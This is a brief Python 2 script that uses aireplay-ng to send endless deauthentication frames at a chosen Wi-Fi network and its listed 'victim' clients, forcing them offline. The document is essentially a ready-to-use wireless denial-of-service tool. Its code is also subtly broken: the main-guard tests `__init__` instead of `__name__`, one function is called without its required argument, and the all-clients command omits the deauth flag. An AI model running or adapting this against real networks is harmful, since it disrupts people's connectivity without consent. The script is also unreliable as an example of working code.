#! /usr/bin/env python

import subprocess
import sys

#Network with multiple known associated stations:
#network = "00:00:00:00:00:00"
#victims = [
#    "00:00:00:00:00:11", #Client 01
#    "00:00:00:00:00:22", #Client 02
#    "00:00:00:00:00:33", #Client 03
#    "00:00:00:00:00:44", #Client 04
#    "00:00:00:00:00:55"] #Client 05

#Network without any known associated station:
network = '00:00:00:00:00:00'
victims = []

def deauth_all_clients(net):
    '''There's no point using this script if you're not gonna specify specific
       clients. You should probably use aireplay-ng directly'''
    print "\n[+] Deauthenticating all clients in the network\n"
    command = "aireplay-ng -a {0} mon0".format(net)
    subprocess.call([command], shell=True) #Runs forever

def deauth_client(net, cli):
    print "\n[+] Deauthenticating {0}\n".format(cli)
    command = "aireplay-ng -a {0} -c {1} -0 3 mon0".format(net, cli)
    subprocess.call([command], shell=True)

if __init__ is '__main__':
    #Init Message
    print "[+] Target Network:\n\t- {0}".format(network)

    if len(victims) == 0:
        deauth_all_clients() #Will only return if there's an error
        sys.exit(1)

    print "[+] Target Clients:"
    for i in range(0, len(victims)):
        print "\t- {0}".format(victims[i])

    while True:
        for i in range(0, len(victims)):
            deauth_client(network, victims[i])
